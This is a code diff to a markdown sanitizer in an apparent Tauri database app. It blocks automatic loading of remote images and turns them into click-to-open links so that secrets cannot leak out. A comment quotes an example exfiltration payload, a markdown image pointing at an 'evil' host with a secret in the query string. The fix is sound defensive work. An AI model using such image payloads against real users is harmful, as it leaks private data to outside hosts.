@@ -6,7 +6,11 @@ import { Marked, type Tokens } from "marked";
  * The output is injected with `dangerouslySetInnerHTML` inside a webview that can
  * call Tauri commands, so any script execution would be equivalent to full access
  * to the user's databases. Raw HTML in the source is therefore rendered as text and
- * only http(s)/mailto/anchor links and http(s)/data-image sources are kept.
+ * only http(s)/mailto/anchor links and inline data-image sources are kept.
+ *
+ * Remote images are never loaded automatically: their URL could carry data out
+ * (e.g. `![](https://evil/?q=<secret>)`). They are shown as a link the user must
+ * click, and the CSP `img-src` does not allow remote origins either.
  */
 
 const ESCAPES: Record<string, string> = {
@@ -22,7 +26,8 @@ export function escapeHtml(text: string): string {
 }
 
 const SAFE_LINK = /^(https?:|mailto:|#)/i;
-const SAFE_IMAGE = /^(https?:|data:image\/(png|jpe?g|gif|webp);)/i;
+const INLINE_IMAGE = /^data:image\/(png|jpe?g|gif|webp);/i;
+const REMOTE_IMAGE = /^https?:/i;
 
 function cleanUrl(href: string | null | undefined, allowed: RegExp): string | null {
   if (!href) return null;
@@ -47,10 +52,15 @@ const safeMarked = new Marked({
       return `<a href="${escapeHtml(url)}"${t} target="_blank" rel="noopener noreferrer">${inner}</a>`;
     },
     image({ href, title, text }: Tokens.Image) {
-      const url = cleanUrl(href, SAFE_IMAGE);
-      if (!url) return escapeHtml(text);
       const t = title ? ` title="${escapeHtml(title)}"` : "";
-      return `<img src="${escapeHtml(url)}" alt="${escapeHtml(text)}"${t}>`;
+      const inline = cleanUrl(href, INLINE_IMAGE);
+      if (inline) {
+        return `<img src="${escapeHtml(inline)}" alt="${escapeHtml(text)}"${t}>`;
+      }
+      const remote = cleanUrl(href, REMOTE_IMAGE);
+      if (!remote) return escapeHtml(text);
+      const label = escapeHtml(text || "imagen");
+      return `<a href="${escapeHtml(remote)}"${t} target="_blank" rel="noopener noreferrer">[Imagen remota: ${label}]</a>`;
     },
   },
 });
